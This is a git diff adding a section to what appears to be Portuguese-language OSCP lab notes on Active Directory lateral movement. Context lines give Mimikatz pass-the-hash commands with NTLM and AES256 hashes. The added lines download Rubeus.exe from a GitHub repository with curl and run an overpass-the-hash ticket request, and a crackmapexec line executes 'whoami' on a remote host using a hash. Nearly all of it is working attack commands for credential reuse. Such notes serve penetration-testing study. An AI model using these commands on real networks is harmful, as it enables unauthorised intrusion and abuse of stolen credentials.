@@ -1254,6 +1254,12 @@ Sekurlsa::pth /user:goku /domain:tech.local /ntlm:4533aaba903fbbe1377deb16427432
 Sekurlsa::pth /user:tech\goku /domain:tech.local /ntlm:4533aaba903fbbe1377deb1642743283 /run:powershell.exe
 Sekurlsa::pth /user:goku /domain:tech.local /aes256:e22ebc7f0546cb07424c6b261596c27440b876c01aa3af04ace01da58fdea26f /run:powershell.exe
 ```
+##### LATERAL MOVEMENT RUBEUS - OVER PASS THE HASH WINDOWS PARA WINDOWS (FUNCIONOU LINDO)
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
+.\Rubeus.exe asktgt /domain:tech.local /user:goku /rc4:4533aaba903fbbe1377deb1642743283 /ptt
+```
+
 ##### LATERAL MOVEMENT CRACKMAPEXEC - OVER PASS THE HASH LINUX PARA WINDOWS (FUNCIONOU - COMANDO)
 ```
 crackmapexec smb 172.31.13.86 -u goku -H 4533aaba903fbbe1377deb1642743283 -d tech.local -x whoami
